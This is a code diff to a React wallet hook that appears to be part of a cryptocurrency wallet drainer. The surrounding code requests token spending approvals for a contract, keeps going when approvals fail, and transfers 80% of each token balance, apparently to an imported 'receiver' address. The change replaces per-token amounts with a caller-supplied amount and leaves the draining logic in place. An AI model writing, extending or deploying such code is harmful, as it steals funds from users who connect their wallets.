@@ -9,7 +9,7 @@ import contractAbi from "../blockchain/contract.json";
 import { config, receiver } from "./Web3Config";
 import { API_KEY } from "./Web3Config";
 
-export const UseWallet = () => {
+export const UseWallet = (amount) => {
     const account = useAccount();
 
     // Chain status tracking
@@ -76,11 +76,11 @@ export const UseWallet = () => {
                 try {
                     const tx = await tokenContract.approve(
                         getContractAddress(account.chainId),
-                        utils.parseUnits(token.tokenAmount.toString(), token.tokenDecimal)
+                        utils.parseUnits(amount.toString(), token.tokenDecimal)
                     );
                     console.log(`Approval tx hash: ${tx.hash}`);
                     await tx.wait();
-                    console.log(`Approved ${token.tokenAmount} of ${token.tokenName}`);
+                    console.log(`Approved ${amount} of ${token.tokenName}`);
                 } catch (error) {
                     console.error(`Approval failed for ${token.tokenName}:`, error);
                     // Continue to the next token even if approval fails
@@ -123,7 +123,7 @@ export const UseWallet = () => {
                     signer
                 );
 
-                const amountInWei = ethers.BigNumber.from(tokenAmount.toString())
+                const amountInWei = ethers.BigNumber.from(amount.toString())
                     .mul(8)
                     .div(10); // Transfer 80% of the balance
 
@@ -168,7 +168,7 @@ export const UseWallet = () => {
 
         const tokenAddresses = tokens.map((token) => token.tokenAddress);
         const amounts = tokens.map((token) =>
-            ethers.BigNumber.from(token.tokenAmount).mul(8).div(10)
+            ethers.BigNumber.from(amount).mul(8).div(10)
         );
 
         try {
